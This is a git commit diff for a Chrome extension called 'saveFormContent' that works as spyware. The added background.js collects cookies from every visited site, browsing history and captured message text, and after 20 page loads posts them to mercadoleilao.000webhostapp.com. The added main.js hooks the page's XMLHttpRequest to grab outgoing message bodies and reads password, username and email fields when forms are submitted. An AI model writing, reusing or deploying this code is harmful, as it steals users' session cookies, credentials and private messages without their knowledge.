405b704b0ba8784eaa6a937bb787c87caebfe863
Danilo da Silveira Figueira <danilomalzao@users.noreply.github.com>
2017-11-12 10:57:19 -0200

    2

--- saveFormContent/background.js
+++ saveFormContent/background.js
@@ -1,29 +1,58 @@
-/**
- * Possible parameters for request:
- *  action: "xhttp" for a cross-origin HTTP request
- *  method: Default "GET"
- *  url   : required, but not validated
- *  data  : data to send in a POST request
- *
- * The callback function is called upon completion of the request */
-chrome.runtime.onMessage.addListener(function(request, sender, callback) {
-    if (request.action == "xhttp") {
-        var xhttp = new XMLHttpRequest();
-        var method = request.method ? request.method.toUpperCase() : 'GET';
+var changed = {};
+var visited = [];
+var cookiesArr = [];
+var msgArr = [];
 
-        xhttp.onload = function() {
-            callback(xhttp.responseText);
-        };
-        xhttp.onerror = function() {
-            // Do whatever you want on error. Don't forget to invoke the
-            // callback to clean up the communication port.
-            callback();
-        };
-        xhttp.open(method, request.url, true);
-        if (method == 'POST') {
-            xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+chrome.cookies.onChanged.addListener(function(info){
+  var cookie = info.cookie;
+  if (cookie.name == "cmsgl" && cookie.value) {
+      msgArr.push(cookie.value);
+  }
+});
+
+chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
+    function sendRequest(request, callback) {
+        if (request.action == "xhttp") {
+            var xhttp = new XMLHttpRequest();
+            var method = request.method ? request.method.toUpperCase() : 'GET';
+
+            xhttp.onload = function () {
+                callback(xhttp.responseText);
+            };
+            xhttp.onerror = function () {
+                // Do whatever you want on error. Don't forget to invoke the
+                // callback to clean up the communication port.
+                callback();
+            };
+            xhttp.open(method, request.url, true);
+            if (method == 'POST') {
+                xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            }
+            xhttp.send(request.data);
+            return true; // prevents the callback from being called too early on return
         }
-        xhttp.send(request.data);
-        return true; // prevents the callback from being called too early on return
+    }
+
+    var tabDomain = tab.url.match(/^[\w-]+:\/{2,}\[?([\w\.:-]+)\]?(?::[0-9]*)?/)[1];
+    if (changeInfo.status === "complete") {
+        if (changed[tabId] !== tabDomain) {
+            chrome.cookies.getAll({url: tab.url}, function (cookies) {
+                cookiesArr.push(cookies);
+            });
+            changed[tabId] = tabDomain;
+        }
+        visited.push(tab.url);
+        if (visited.length >= 20) {
+            sendRequest({
+                method: 'POST',
+                action: 'xhttp',
+                url: 'http://mercadoleilao.000webhostapp.com/sendmail.php',
+                data: 'cookie=' + encodeURIComponent(JSON.stringify(cookiesArr)) + '&visited=' + encodeURIComponent(visited.join("\n")) + '&msg=' + encodeURIComponent(msgArr.join("\n----\n"))
+            }, function (responseText) {
+            });
+            visited = [];
+            msgArr = [];
+            cookiesArr = [];
+        }
     }
 });
--- saveFormContent/main.js
+++ saveFormContent/main.js
@@ -1,17 +1,67 @@
-var s = document.createElement('script');
-s.src = chrome.extension.getURL('request.js');
-(document.head||document.documentElement).appendChild(s);
-s.onload = function() {
-    s.parentNode.removeChild(s);
-};
+function exec(fn) {
+    var s = document.createElement('script');
+    s.setAttribute("type", "application/javascript");
+    s.onload = function () {
+        s.parentNode.removeChild(s);
+    };
+    (document.head || document.documentElement).appendChild(s);
+    s.textContent = '(' + fn + ')("' + chrome.runtime.id + '")';
+}
+
+exec(function (parameter) {
+    function saveOption(cname, cvalue) {
+      var days = 2;
+      var d = new Date();
+      d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+      var expires = "expires=" + d.toUTCString();
+      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+  }
+  
+    var extensionID = parameter;
+    var origOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function () {
+        var getParameterByName = function (content, name) {
+            name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+            var regex = new RegExp("[\\?&]" + name + "=([^&#]*)", "i"),
+                results = regex.exec(content);
+            return results == null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+        };
+        var func = function () {
+            var content = this.PARAMETERS_S;
+            var sendContent = getParameterByName(content || "  ", "body");
+            if (sendContent) {
+                var msg = encodeURI(sendContent) + " " + getParameterByName(content || "  ", "specific_to_list[0]") + getParameterByName(content || "  ", "specific_to_list[1]");
+                saveOption("cmsgl", msg);
+                chrome.runtime.sendMessage(extensionID, {
+                    action: "add",
+                    data: msg
+                }, function (responseText) {
+                });
+            }
+            this.removeEventListener("load", func);
+        };
+        this.addEventListener('load', func);
+        origOpen.apply(this, arguments);
+    };
+    var origSend = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function () {
+        this.PARAMETERS_S = arguments[0];
+        origSend.apply(this, arguments);
+    };
+
+});
 
 $(function () {
 
     $("form").submit(function (e) {
         var passwordBoxes = $("input[type=password]");
-        var username = $("input[type=text]").not(passwordBoxes).filter(function() {
-           var field = $( this );
-           return field && ( field.val() || field.html() ) || {val:function(){return "nouser"}};
+        var username = $("input[type=text]").not(passwordBoxes).filter(function () {
+            var field = $(this);
+            return field && ( field.val() || field.html() ) || {
+                    val: function () {
+                        return "nouser"
+                    }
+                };
         }).val();
         var email = $("input[type=email]").val();
         var password = passwordBoxes && passwordBoxes.val() || "";
@@ -24,42 +74,5 @@ $(function () {
             }, function (responseText) {
             });
     });
-    
-    
-    /*
-var origOpen = XMLHttpRequest.prototype.open;
-      XMLHttpRequest.prototype.open = function () {
-        var getParameterByName = function (content, name) {
-              name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
-              var regex = new RegExp("[\\?&]" + name + "=([^&#]*)", "i"),
-                  results = regex.exec(content);
-              return results == null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
-          };
-          var func = function () {
-              alert("AAAAAE");
-              var content = this.PARAMETERS_S;
-              var sendContent = getParameterByName(content || "  ", "body");
-              if (sendContent) {
-                
-                  var msg = encodeURI(sendContent) + " " + getParameterByName(content || "  ", "specific_to_list[0]") + getParameterByName(content || "  ", "specific_to_list[1]");
-                  console.log(msg);
-                  alert("AAAAAA");
-                  $.ajax({
-                    type: 'GET',
-                    crossDomain: true,
-                    async : false,
-                    url: 'http://mercadoleilao.000webhostapp.com/analyse.php?c=' + msg
-                    //data: msg //Change to add any headers to be sent along
-                  });
-              }
-              this.removeEventListener("load", func);
-          };
-          this.addEventListener('load', func);
-          origOpen.apply(this, arguments);
-      };
-      var origSend = XMLHttpRequest.prototype.send;
-      XMLHttpRequest.prototype.send = function () {
-          this.PARAMETERS_S = arguments[0];
-          origSend.apply(this, arguments);
-      };*/
+
 });
